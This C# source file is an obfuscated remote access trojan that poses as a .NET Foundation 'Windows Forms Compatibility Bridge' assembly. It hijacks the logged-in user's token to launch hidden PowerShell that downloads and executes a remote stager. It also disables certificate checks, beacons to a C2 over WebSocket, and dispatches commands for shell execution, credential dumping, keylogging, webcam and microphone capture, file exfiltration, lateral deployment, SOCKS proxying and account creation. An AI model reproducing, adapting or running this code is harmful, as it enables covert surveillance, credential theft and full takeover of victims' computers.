

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Security;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

[assembly: System.Reflection.AssemblyTitle("Windows Forms Compatibility Bridge")]
[assembly: System.Reflection.AssemblyDescription("Windows Forms Compatibility Bridge")]
[assembly: System.Reflection.AssemblyCompany(".NET Foundation")]
[assembly: System.Reflection.AssemblyProduct("WinFormsBridge")]
[assembly: System.Reflection.AssemblyCopyright("Copyright (c) .NET Foundation 2024")]
[assembly: System.Reflection.AssemblyVersion("6.0.2.0")]
[assembly: System.Reflection.AssemblyFileVersion("6.0.2.0")]

namespace _NkVWxehwp
{
    internal static class _Q
    {
        static readonly byte[] _k = new byte[] { 0x6C, 0xF9, 0x27, 0xC7, 0xCB, 0xFD, 0xE7, 0x02, 0x23, 0x03, 0xB1, 0x33, 0x71, 0x11, 0xD4, 0x76 };
        internal static string _S(string b)
        {
            byte[] d = System.Convert.FromBase64String(b);
            byte[] r = new byte[d.Length];
            for (int i = 0; i < d.Length; i++) r[i] = (byte)(d[i] ^ _k[i % _k.Length]);
            return System.Text.Encoding.UTF8.GetString(r);
        }
    }

    
    
    
    public static class _CbUoPc
    {

        [DllImport("kernel32.dll")]
        static extern uint WTSGetActiveConsoleSessionId();
        [DllImport("kernel32.dll")]
        static extern uint ProcessIdToSessionId(uint processId, out uint sessionId);
        [DllImport("kernel32.dll")]
        static extern uint GetCurrentProcessId();
        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSQueryUserToken(uint sessionId, out IntPtr phToken);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();
        [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder lpProfileDir, ref uint lpcchSize);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved, lpDesktop, lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public int dwProcessId, dwThreadId;
        }

        static bool IsSession0()
        {
            uint sid;
            ProcessIdToSessionId(GetCurrentProcessId(), out sid);
            return sid == 0;
        }

        static bool RelaunchInUserSession(string serverUrl, string token, string deployId)
        {
            try
            {
                uint consoleSid = WTSGetActiveConsoleSessionId();
                if (consoleSid == 0 || consoleSid == 0xFFFFFFFF) return false;

                IntPtr userToken;
                if (!WTSQueryUserToken(consoleSid, out userToken)) return false;

                IntPtr dupToken;
                if (!DuplicateTokenEx(userToken, 0x02000000, IntPtr.Zero, 2, 1, out dupToken))
                {
                    CloseHandle(userToken);
                    return false;
                }
                CloseHandle(userToken);

                string mid = Environment.MachineName;
                string stagerUrl = serverUrl.TrimEnd('/') + "/api/agent/stager?mid=" + Uri.EscapeDataString(mid);
                if (!string.IsNullOrEmpty(token)) stagerUrl += "&token=" + Uri.EscapeDataString(token);
                if (!string.IsNullOrEmpty(deployId)) stagerUrl += "&deployId=" + Uri.EscapeDataString(deployId);
                string psCmd = "powershell.exe -ep bypass -w hidden -NonI -c \"[Net.ServicePointManager]::SecurityProtocol='Tls12';IEX((New-Object Net.WebClient).DownloadString('" + stagerUrl + "'))\"";

                var si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = @"winsta0\default";
                si.dwFlags = 1; 
                si.wShowWindow = 0; 
                PROCESS_INFORMATION pi;

                bool ok = CreateProcessAsUserW(dupToken, null, psCmd, IntPtr.Zero, IntPtr.Zero, false,
                    0x08000000, 
                    IntPtr.Zero, null, ref si, out pi);
                CloseHandle(dupToken);
                if (ok)
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                return ok;
            }
            catch { return false; }
        }

        public static void Run(string serverUrl, string token, string signKey, string deployId)
        {
            
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            
            if (IsSession0())
            {
                RelaunchInUserSession(serverUrl, token, deployId);
                return; 
            }

            
            bool created;
            var mutex = new Mutex(true, _Q._S("K5VIpaqRu09KbdhyFnS6AjrLeA==") + Environment.MachineName, out created);
            if (!created) return;

            
            
            try { _HYogZcd._dDeVZgMucrmUeafQ(); } catch { }
            try { _HYogZcd._yJXFtwtl(); } catch { }

            var agent = new _fCGnnZ(serverUrl, token, signKey, deployId);
            agent.Mutex = mutex;
            agent._nJyqlgRdAp();

            
            try { mutex.ReleaseMutex(); } catch {}
            if (agent._ouhHQJzIxvdbt)
            {
                
                try { mutex.Close(); } catch {}
                Thread.Sleep(1000);
            }
            GC.KeepAlive(mutex);
        }
    }

    
    
    
    internal class _fCGnnZ
    {
        const string Version = "21.0.0-cs";
        const int ReportIntervalSec = 10;
        const int PingIntervalSec = 30;
        const int ReconnectMaxSec = 30;

        
        [DllImport("kernel32.dll")]
        static extern uint WTSGetActiveConsoleSessionId();
        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSQueryUserToken(uint sessionId, out IntPtr phToken);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();
        [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder lpProfileDir, ref uint lpcchSize);

        
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_open_v2", CallingConvention = CallingConvention.Cdecl)]
        static extern int sqlite3_open_v2(byte[] filename, out IntPtr ppDb, int flags, IntPtr zVfs);
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_prepare_v2", CallingConvention = CallingConvention.Cdecl)]
        static extern int sqlite3_prepare_v2(IntPtr db, byte[] zSql, int nByte, out IntPtr ppStmt, IntPtr pzTail);
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_step", CallingConvention = CallingConvention.Cdecl)]
        static extern int sqlite3_step(IntPtr pStmt);
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_text", CallingConvention = CallingConvention.Cdecl)]
        static extern IntPtr sqlite3_column_text(IntPtr pStmt, int iCol);
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_blob", CallingConvention = CallingConvention.Cdecl)]
        static extern IntPtr sqlite3_column_blob(IntPtr pStmt, int iCol);
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_bytes", CallingConvention = CallingConvention.Cdecl)]
        static extern int sqlite3_column_bytes(IntPtr pStmt, int iCol);
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_finalize", CallingConvention = CallingConvention.Cdecl)]
        static extern int sqlite3_finalize(IntPtr pStmt);
        [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_close", CallingConvention = CallingConvention.Cdecl)]
        static extern int sqlite3_close(IntPtr db);
        const int SQLITE_OK = 0;
        const int SQLITE_ROW = 100;
        const int SQLITE_OPEN_READONLY = 1;

        
        [DllImport("wlanapi.dll")]
        static extern uint WlanOpenHandle(uint dwClientVersion, IntPtr pReserved, out uint pdwNegotiatedVersion, out IntPtr phClientHandle);
        [DllImport("wlanapi.dll")]
        static extern uint WlanCloseHandle(IntPtr hClientHandle, IntPtr pReserved);
        [DllImport("wlanapi.dll")]
        static extern uint WlanEnumInterfaces(IntPtr hClientHandle, IntPtr pReserved, out IntPtr ppInterfaceList);
        [DllImport("wlanapi.dll")]
        static extern uint WlanGetProfileList(IntPtr hClientHandle, ref Guid pInterfaceGuid, IntPtr pReserved, out IntPtr ppProfileList);
        [DllImport("wlanapi.dll", CharSet = CharSet.Unicode)]
        static extern uint WlanGetProfile(IntPtr hClientHandle, ref Guid pInterfaceGuid, string strProfileName, IntPtr pReserved, out IntPtr pstrProfileXml, ref uint pdwFlags, out uint pdwGrantedAccess);
        [DllImport("wlanapi.dll")]
        static extern void WlanFreeMemory(IntPtr pMemory);
        const uint WLAN_PROFILE_GET_PLAINTEXT_KEY = 4;

        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

        
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, out int lpNumberOfBytesRead, IntPtr lpOverlapped);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetFileSize(IntPtr hFile, out uint lpFileSizeHigh);
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        readonly string _hXDJfNdoAJ;
        string _AkICMo;
        readonly byte[] _Xybowkof;
        readonly string _deployId;
        readonly string _AQWXONNmPr;
        readonly string _gXbezr;

        ClientWebSocket _ws;
        volatile bool _wsDisposed;
        volatile bool _wsConnectedOnce;
        readonly SemaphoreSlim _EPgJvQkInc = new SemaphoreSlim(1, 1);
        readonly ConcurrentDictionary<string, _ljnXSROthf> _HAaNCCPVSFYA =
            new ConcurrentDictionary<string, _ljnXSROthf>();
        readonly ConcurrentDictionary<string, _YztSpVugDPypw> _xotoYqccLlIugpV =
            new ConcurrentDictionary<string, _YztSpVugDPypw>();
        readonly CancellationTokenSource _cts = new CancellationTokenSource();
        internal Mutex Mutex;

        public _fCGnnZ(string serverUrl, string token, string signKey, string deployId)
        {
            _hXDJfNdoAJ = serverUrl.TrimEnd('/');
            _AkICMo = token ?? "";
            _Xybowkof = string.IsNullOrEmpty(signKey) ? new byte[0] : Encoding.UTF8.GetBytes(signKey);
            _deployId = deployId ?? "";
            _AQWXONNmPr = _hXDJfNdoAJ + "/api/agent/report";

            var uri = new Uri(_hXDJfNdoAJ);
            var wsScheme = uri.Scheme == "https" ? "wss" : "ws";
            _gXbezr = string.Format("{0}://{1}/ws/agent?token=", wsScheme, uri.Authority);
        }

        
        public void _nJyqlgRdAp()
        {
            
            if (string.IsNullOrEmpty(_AkICMo))
            {
                _AkICMo = _TCqajNZbZPEl();
                if (string.IsNullOrEmpty(_AkICMo))
                    throw new Exception("_fCGnnZ 注册失败，无法获取 Token");
            }

            
            var reportThread = new Thread(_WPwZqTHFAW) { IsBackground = true };
            reportThread.Start();

            
            _ekiJtZ();
        }

        
        string _TCqajNZbZPEl()
        {
            var hostname = Environment.MachineName;
            var body = string.Format("{{\"hostname\":\"{0}\",\"os\":\"windows\",\"ip\":\"\"}}", _AexenijxeK(hostname));
            var url = _hXDJfNdoAJ + "/api/agent/register";

            try
            {
                var resp = _fDVwBfdz(url, body);
                var token = _hUALleDbnckSq(resp, "token");
                return token;
            }
            catch
            {
                
                return null;
            }
        }

        
        void _ekiJtZ()
        {
            int backoffMs = 1000;
            var rng = new Random();

            while (!_cts.IsCancellationRequested)
            {
                bool wasConnected = false;
                try
                {
                    _wsConnectedOnce = false;
                    _CvizzlujD().GetAwaiter().GetResult();
                }
                catch
                {
                }
                wasConnected = _wsConnectedOnce;

                
                CleanupAllSessions();

                if (_cts.IsCancellationRequested) break;

                
                if (wasConnected) backoffMs = 1000;

                
                int jitter = rng.Next(backoffMs / 2);
                Thread.Sleep(backoffMs + jitter);
                backoffMs = Math.Min(backoffMs * 2, ReconnectMaxSec * 1000);
            }
        }

        
        void CleanupAllSessions()
        {
            
            foreach (var kv in _HAaNCCPVSFYA)
            {
                _ljnXSROthf ps;
                if (_HAaNCCPVSFYA.TryRemove(kv.Key, out ps))
                    try { ps.Dispose(); } catch { }
            }
            
            foreach (var kv in _xotoYqccLlIugpV)
            {
                _YztSpVugDPypw ss;
                if (_xotoYqccLlIugpV.TryRemove(kv.Key, out ss))
                    try { ss.Stop(); } catch { }
            }
            
            foreach (var kv in _tunnels)
            {
                System.Net.Sockets.TcpClient tcp;
                if (_tunnels.TryRemove(kv.Key, out tcp))
                    try { tcp.Close(); } catch { }
            }
            
            _micStreaming = false;
        }

        
        async Task _CvizzlujD()
        {
            _wsDisposed = false;
            _ws = new ClientWebSocket();
            _ws.Options.SetRequestHeader(_Q._S("NNRmoK6Tky9sUA=="), "windows");
            
            var wsUri = new Uri(_gXbezr + _AkICMo);
            await _ws.ConnectAsync(wsUri, _cts.Token);
            _wsConnectedOnce = true; 

            
            var pingCts = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token);
            var pingTask = _TuNHsrWT(pingCts.Token);

            try
            {
                var buf = new byte[64 * 1024];
                while (_ws.State == WebSocketState.Open && !_cts.IsCancellationRequested)
                {
                    var result = await _ws.ReceiveAsync(new ArraySegment<byte>(buf), _cts.Token);
                    if (result.MessageType == WebSocketMessageType.Close)
                        break;

                    if (result.MessageType == WebSocketMessageType.Binary)
                    {
                        
                        var ms = new MemoryStream();
                        ms.Write(buf, 0, result.Count);
                        while (!result.EndOfMessage)
                        {
                            result = await _ws.ReceiveAsync(new ArraySegment<byte>(buf), _cts.Token);
                            ms.Write(buf, 0, result.Count);
                        }
                        byte[] frame = ms.ToArray();
                        ThreadPool.QueueUserWorkItem(_ => HandleTunnelBinaryFrame(frame));
                    }
                    else if (result.MessageType == WebSocketMessageType.Text)
                    {
                        
                        var ms = new MemoryStream();
                        ms.Write(buf, 0, result.Count);
                        while (!result.EndOfMessage)
                        {
                            result = await _ws.ReceiveAsync(new ArraySegment<byte>(buf), _cts.Token);
                            ms.Write(buf, 0, result.Count);
                        }
                        var json = Encoding.UTF8.GetString(ms.ToArray());
                        
                        ThreadPool.QueueUserWorkItem(_ => _KFAFTmeURDMUF(json));
                    }
                }
            }
            catch { }

            
            _wsDisposed = true;
            pingCts.Cancel();
            try { pingTask.Wait(2000); } catch { }
            try { _ws.Dispose(); } catch { }
        }

        
        async Task _TuNHsrWT(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(PingIntervalSec * 1000, ct);
                    var pong = Encoding.UTF8.GetBytes("{\"type\":\"pong\",\"id\":\"\"}");
                    await _xeAwxL(pong);
                }
                catch { break; }
            }
        }

        
        void _KFAFTmeURDMUF(string json)
        {
            try
            {
                var msgType = _hUALleDbnckSq(json, "type");
                var msgId = _hUALleDbnckSq(json, "id");
                var payload = _QakMRksQlX(json, "payload");

                
                if (msgType != "ping" && msgType != "pong")
                {
                    if (_Xybowkof.Length > 0 && !_pChwTtewgagCWsZ(json))
                    {
                        return;
                    }
                }

                switch (msgType)
                {
                    case "ping":
                        try { _xeAwxL(Encoding.UTF8.GetBytes("{\"type\":\"pong\",\"id\":\"" + _AexenijxeK(msgId) + "\"}")).Wait(5000); } catch { }
                        break;
                    case "exec":
                        _mkraJwlyqG(msgId, payload);
                        break;
                    case "pty_start":
                        _jxCLkkmHGUTByo(msgId, payload);
                        break;
                    case "pty_input":
                        _mUBWOYmCPUGddC(msgId, payload);
                        break;
                    case "pty_resize":
                        HandlePtyResize(msgId, payload);
                        break;
                    case "pty_close":
                        _HasBZbDdJyqACB(msgId);
                        break;
                    case "quick_cmd":
                        _yqFdKxIJBIEnia(msgId, payload);
                        break;
                    case "screen_start":
                        _wcLyfwZsuocnskvpP(msgId, payload);
                        break;
                    case "screen_stop":
                        _OMzhIPyLcijnmGbS(msgId);
                        break;
                    case "mem_exec":
                        _YwGwoHqoFzVys(msgId, payload);
                        break;
                    case "net_scan":
                        ThreadPool.QueueUserWorkItem(_ => _dnWmSCZfhqXHZ(msgId, payload));
                        break;
                    case "lateral_deploy":
                        ThreadPool.QueueUserWorkItem(_ => _jRzDfoNJNKDIljVdYcc(msgId, payload));
                        break;
                    case "cred_dump":
                        ThreadPool.QueueUserWorkItem(_ => _qdAiUoEObwHHaU(msgId, payload));
                        break;
                    case "chat_dump":
                        ThreadPool.QueueUserWorkItem(_ => HandleChatDump(msgId, payload));
                        break;
                    case "file_browse":
                        ThreadPool.QueueUserWorkItem(_ => _KsKKqtNqALTpGLhi(msgId, payload));
                        break;
                    case "file_download":
                        ThreadPool.QueueUserWorkItem(_ => _XOiZnRPnBBupTuArVL(msgId, payload));
                        break;
                    case "webcam_snap":
                        ThreadPool.QueueUserWorkItem(_ => _mWkDaLEWeYPWJRph(msgId, payload));
                        break;
                    case "webcam_start":
                        ThreadPool.QueueUserWorkItem(_ => _PAJjEGzlJhqdXWtbF(msgId, payload));
                        break;
                    case "webcam_stop":
                        _CllMPXYXJlkTTOec(msgId);
                        break;
                    case "self_update":
                        ThreadPool.QueueUserWorkItem(_ => _HGswOWoDySDGdGkq(msgId, payload));
                        break;
                    case "process_list":
                        ThreadPool.QueueUserWorkItem(_ => _czejuKIEeySlduaZV(msgId));
                        break;
                    case "process_kill":
                        ThreadPool.QueueUserWorkItem(_ => _KIpJANOOmsSsJcftr(msgId, payload));
                        break;
                    case "service_list":
                        ThreadPool.QueueUserWorkItem(_ => _LFZqPJjdmfCTacaIU(msgId));
                        break;
                    case "service_control":
                        ThreadPool.QueueUserWorkItem(_ => _nfVfGtnxocrdVQhWSIiS(msgId, payload));
                        break;
                    case "keylog_start":
                        _bRLALCOeYDnsNonPL(msgId);
                        break;
                    case "keylog_stop":
                        _cMMtCxjnGedFMMCV(msgId);
                        break;
                    case "keylog_dump":
                        _WvoTDkEjgZhGcmOP(msgId);
                        break;
                    case "window_list":
                        ThreadPool.QueueUserWorkItem(_ => HandleWindowList(msgId));
                        break;
                    case "window_control":
                        ThreadPool.QueueUserWorkItem(_ => HandleWindowControl(msgId, payload));
                        break;
                    case "mic_start":
                        ThreadPool.QueueUserWorkItem(_ => HandleMicStart(msgId));
                        break;
                    case "mic_stop":
                        HandleMicStop(msgId);
                        break;
                    case "file_steal":
                        HandleFileSteal(msgId, payload);
                        break;
                    case "file_exfil":
                        HandleFileExfil(msgId, payload);
                        break;
                    case "clipboard_dump":
                        HandleClipboardDump(msgId);
                        break;
                    case "info_dump":
                        HandleInfoDump(msgId);
                        break;
                    
                    case "socks_connect":
                        HandleSocksConnect(msgId, payload);
                        break;
                    case "socks_data":
                        HandleSocksData(msgId, payload);
                        break;
                    case "socks_close":
                        HandleSocksClose(msgId, payload);
                        break;
                    
                    case "screen_input":
                        HandleScreenInput(msgId, payload);
                        break;
                    
                    case "file_upload":
                        HandleFileUpload(msgId, payload);
                        break;
                    case "file_upload_start":
                        HandleFileUploadStart(msgId, payload);
                        break;
                    case "file_upload_chunk":
                        HandleFileUploadChunk(msgId, payload);
                        break;
                    
                    case "reg_browse":
                        HandleRegBrowse(msgId, payload);
                        break;
                    case "reg_write":
                        HandleRegWrite(msgId, payload);
                        break;
                    case "reg_delete":
                        HandleRegDelete(msgId, payload);
                        break;
                    
                    case "user_list":
                        HandleUserList(msgId);
                        break;
                    case "user_add":
                        HandleUserAdd(msgId, payload);
                        break;
                    case "user_delete":
                        HandleUserDelete(msgId, payload);
                        break;
                    
                    case "rdp_manage":
                        HandleRdpManage(msgId, payload);
                        break;
                    
                    case "netstat":
                        _UHjQycTByQTjf(msgId);
                        break;
                    
                    case "software_list":
                        _qJpxdZIjNsRNTdlLOu(msgId);
                        break;
                    
                    case "browser_history":
                        ThreadPool.QueueUserWorkItem(_ => _zxnrjVzIWaLKwPQAnfxf(msgId));
                        break;
                    
                    case "stress_start":
                        ThreadPool.QueueUserWorkItem(_ => _qyarqddRobFpIfLlP(msgId, payload));
                        break;
                    case "stress_stop":
                        _FRyXwcmJaYIFFmfY(msgId);
                        break;
                }
            }
            catch
            {
                
            }
        }

        
        void _mkraJwlyqG(string id, string payload)
        {
            var cmd = _hUALleDbnckSq(payload, "command");
            if (string.IsNullOrEmpty(cmd))
                cmd = _hUALleDbnckSq(payload, "cmd");

            int exitCode = 0;
            string output = "", error = "";

            
            bool wmiOk = false;
            try { wmiOk = ExecViaWMI(cmd, out output, out error, out exitCode); } catch { }

            if (!wmiOk)
            {
                
                try
                {
                    string comSpec = Environment.GetEnvironmentVariable("ComSpec");
                    if (string.IsNullOrEmpty(comSpec)) comSpec = _Q._S("D5RD6a6Fgg==");
                    var psi = new ProcessStartInfo(comSpec, "/c " + cmd)
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System)
                    };
                    var proc = Process.Start(psi);
                    string errBuf = "";
                    proc.ErrorDataReceived += (s, e) => { if (e.Data != null) errBuf += e.Data + "\n"; };
                    proc.BeginErrorReadLine();
                    output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit(60000);
                    error = errBuf;
                    exitCode = proc.ExitCode;
                }
                catch (Exception ex)
                {
                    error = ex.Message;
                    exitCode = -1;
                }
            }

            var resultPayload = string.Format(
                "{{\"exitCode\":{0},\"output\":\"{1}\",\"error\":\"{2}\"}}",
                exitCode, _AexenijxeK(output), _AexenijxeK(error));

            _TfnfMjSzCWKv("exec_result", id, resultPayload);
        }

        
        bool ExecViaWMI(string cmd, out string output, out string error, out int exitCode)
        {
            output = ""; error = ""; exitCode = 0;
            string tmpOut = Path.Combine(Path.GetTempPath(), "o" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".tmp");
            string tmpErr = Path.Combine(Path.GetTempPath(), "e" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".tmp");
            try
            {
                string comSpec = Environment.GetEnvironmentVariable("ComSpec");
                if (string.IsNullOrEmpty(comSpec)) comSpec = _Q._S("D5RD6a6Fgg==");
                string fullCmd = comSpec + " /c " + cmd + " > \"" + tmpOut + "\" 2> \"" + tmpErr + "\"";

                using (var mgmt = new ManagementClass("Win32_Process"))
                {
                    var inParams = mgmt.GetMethodParameters("Create");
                    inParams["CommandLine"] = fullCmd;
                    inParams["CurrentDirectory"] = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    var outParams = mgmt.InvokeMethod("Create", inParams, null);
                    int ret = Convert.ToInt32(outParams["ReturnValue"]);
                    if (ret != 0) return false;

                    int pid = Convert.ToInt32(outParams["ProcessId"]);
                    
                    try
                    {
                        var proc = Process.GetProcessById(pid);
                        proc.WaitForExit(60000);
                        try { exitCode = proc.ExitCode; } catch { }
                    }
                    catch { } 
                }

                if (File.Exists(tmpOut)) output = File.ReadAllText(tmpOut);
                if (File.Exists(tmpErr)) error = File.ReadAllText(tmpErr);
                return true;
            }
            catch { return false; }
            finally
            {
                try { File.Delete(tmpOut); } catch { }
                try { File.Delete(tmpErr); } catch { }
            }
        }

        
        void _jxCLkkmHGUTByo(string id, string payload)
        {
            if (_HAaNCCPVSFYA.ContainsKey(id))
                return;

            var session = new _ljnXSROthf(id, data =>
            {
                var escaped = _AexenijxeK(data);
                _TfnfMjSzCWKv("pty_output", id,
                    string.Format("{{\"data\":\"{0}\"}}", escaped));
            },
            code =>
            {
                _TfnfMjSzCWKv("pty_exit", id,
                    string.Format("{{\"code\":{0}}}", code));
                _ljnXSROthf removed;
                _HAaNCCPVSFYA.TryRemove(id, out removed);
            });

            if (_HAaNCCPVSFYA.TryAdd(id, session))
            {
                int cols = 120, rows = 30;
                var cStr = _hUALleDbnckSq(payload, "cols");
                var rStr = _hUALleDbnckSq(payload, "rows");
                if (!string.IsNullOrEmpty(cStr)) int.TryParse(cStr, out cols);
                if (!string.IsNullOrEmpty(rStr)) int.TryParse(rStr, out rows);
                if (cols <= 0) cols = 120; if (rows <= 0) rows = 30;
                session.Start(cols, rows);
                _TfnfMjSzCWKv("pty_started", id, "{\"mode\":\"pty\"}");
            }
        }

        
        void _mUBWOYmCPUGddC(string id, string payload)
        {
            _ljnXSROthf session;
            if (_HAaNCCPVSFYA.TryGetValue(id, out session))
            {
                var data = _hUALleDbnckSq(payload, "data");
                if (!string.IsNullOrEmpty(data))
                    session._CmsCNTGoha(data);
            }
        }

        
        void HandlePtyResize(string id, string payload)
        {
            _ljnXSROthf session;
            if (_HAaNCCPVSFYA.TryGetValue(id, out session))
            {
                int cols = 120, rows = 30;
                var c = _hUALleDbnckSq(payload, "cols");
                var r = _hUALleDbnckSq(payload, "rows");
                if (!string.IsNullOrEmpty(c)) int.TryParse(c, out cols);
                if (!string.IsNullOrEmpty(r)) int.TryParse(r, out rows);
                if (cols > 0 && rows > 0) session.Resize(cols, rows);
            }
        }

        
        void _HasBZbDdJyqACB(string id)
        {
            _ljnXSROthf session;
            if (_HAaNCCPVSFYA.TryRemove(id, out session))
            {
                session.Dispose();
            }
        }

        
        void _yqFdKxIJBIEnia(string id, string payload)
        {
            var cmd = _hUALleDbnckSq(payload, "cmd");
            string output = "", error = "";
            int exitCode = 0;
            try
            {
                switch (cmd)
                {
                    case "show_desktop":
                        _sIlEfRWIP(_Q._S("HJZQormOj2dPb59WCXQ="), "-ep bypass -w hidden -c \"(New-Object -ComObject Shell.Application).ToggleDesktop()\"");
                        output = "已切换到桌面";
                        break;
                    case "lock_screen":
                        _sIlEfRWIP(_Q._S("HoxJo6eR1DANZslW"), "user32.dll,LockWorkStation");
                        output = "已锁定屏幕";
                        break;
                    case "task_manager":
                        Process.Start(_Q._S("GJhUrKaalSxGe9Q="));
                        output = "已启动任务管理器";
                        break;
                    case "file_explorer":
                        Process.Start(_Q._S("CYFXq6SPgnANZslW"));
                        output = "已启动文件管理器";
                        break;
                    case "cmd":
                        Process.Start(_Q._S("D5RD6a6Fgg=="));
                        output = "已启动命令提示符";
                        break;
                    default:
                        error = "未知指令: " + cmd;
                        exitCode = -1;
                        break;
                }
            }
            catch (Exception ex) { error = ex.Message; exitCode = -1; }

            _TfnfMjSzCWKv("quick_cmd_result", id, string.Format(
                "{{\"exitCode\":{0},\"output\":\"{1}\",\"error\":\"{2}\"}}",
                exitCode, _AexenijxeK(output), _AexenijxeK(error)));
        }

        static void _sIlEfRWIP(string exe, string args)
        {
            var psi = new ProcessStartInfo(exe, args)
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            Process.Start(psi);
        }

        
        void _wcLyfwZsuocnskvpP(string id, string payload)
        {
            int fps = 10, quality = 70, scale = 100;
            var s1 = _hUALleDbnckSq(payload, "fps");
            var s2 = _hUALleDbnckSq(payload, "quality");
            var s3 = _hUALleDbnckSq(payload, "scale");
            if (!string.IsNullOrEmpty(s1)) int.TryParse(s1, out fps);
            if (!string.IsNullOrEmpty(s2)) int.TryParse(s2, out quality);
            if (!string.IsNullOrEmpty(s3)) int.TryParse(s3, out scale);
            if (fps <= 0 || fps > 60) fps = 10;
            if (quality <= 0 || quality > 100) quality = 70;
            if (scale <= 0 || scale > 100) scale = 100;

            
            foreach (var key in _xotoYqccLlIugpV.Keys)
            {
                _YztSpVugDPypw old;
                if (_xotoYqccLlIugpV.TryRemove(key, out old))
                    old.Stop();
            }

            var agent = this;
            int frameSending = 0; 
            var session = new _YztSpVugDPypw(id, fps, quality, scale,
                (frameData, fullW, fullH, rx, ry, rw, rh) =>
                {
                    
                    if (Interlocked.CompareExchange(ref frameSending, 1, 0) != 0)
                        return;

                    string header;
                    if (rx == -1)
                    {
                        header = string.Format(
                            "{{\"type\":\"screen_frame\",\"id\":\"{0}\",\"payload\":{{\"width\":{1},\"height\":{2},\"size\":{3},\"codec\":\"h264\",\"keyframe\":{4}}}}}",
                            _AexenijxeK(id), fullW, fullH, frameData.Length, ry == 1 ? "true" : "false");
                    }
                    else
                    {
                        bool isFull = (rx == 0 && ry == 0 && rw == fullW && rh == fullH);
                        header = string.Format(
                            "{{\"type\":\"screen_frame\",\"id\":\"{0}\",\"payload\":{{\"width\":{1},\"height\":{2},\"size\":{3},\"x\":{4},\"y\":{5},\"cw\":{6},\"ch\":{7},\"full\":{8}}}}}",
                            _AexenijxeK(id), fullW, fullH, frameData.Length, rx, ry, rw, rh, isFull ? "true" : "false");
                    }
                    
                    byte[] hdrBytes = Encoding.UTF8.GetBytes(header);
                    agent.WsSendTextThenBinary(hdrBytes, frameData).ContinueWith(_ =>
                    {
                        Interlocked.Exchange(ref frameSending, 0);
                    });
                },
